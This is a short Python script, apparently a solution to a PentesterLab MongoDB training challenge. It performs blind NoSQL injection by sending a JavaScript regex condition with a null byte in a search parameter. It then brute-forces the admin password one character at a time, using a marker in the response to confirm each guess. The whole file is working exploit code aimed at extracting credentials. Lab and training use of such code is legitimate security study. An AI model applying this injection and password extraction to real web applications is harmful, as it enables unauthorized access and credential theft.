#Program was made for PentesterLab MongoDB challange

import requests  #best of library for web requests
import string
import re
#import requests_html 

import re

def checkBrute(str1):  
                # Create the URL      
                print(str1)
                URL = 'http://ptl-eb7cd0e0-778a277a.libcurl.so'
                URL2= f'/?search=admin%27%20%26%26%20this.password%20%26%26%20this.password.match(/{str1}/)%00'        
                F_URL= URL+URL2        
                
                #Send GET request                
                req = requests.get(F_URL)
                
                #Application behviour is that it give >admin< tag on matches so we try to look for it on each search iteration
                print(re.findall('>admin<', req.text)) 
                #print(match-word)                
                if(list(re.findall('>admin<', req.text)) == ['>admin<']):
                        return True
                else:
                        return False
def main():
         

        # Create character set to match
        charset = list(string.ascii_letters)+ list(range(0,10))+list('-')
        password = ''

        #Program logic for fuzzing each charater
        while True:
                for l in charset:
                        print("Trying "+str(l)+" for "+password)
                        test = password+str(l)
                        print("Current Value of Test: "+test)
                        #Test each time from start till the so far found string
                        if checkBrute(f'^{test}.*$'):
                                password+=str(l)
                                print(password)
                                break

#this program is not smart enough to break after finding password.
#We need to know the password lenght and break once we are sure we found the complete password 


if __name__ == '__main__':
    main()






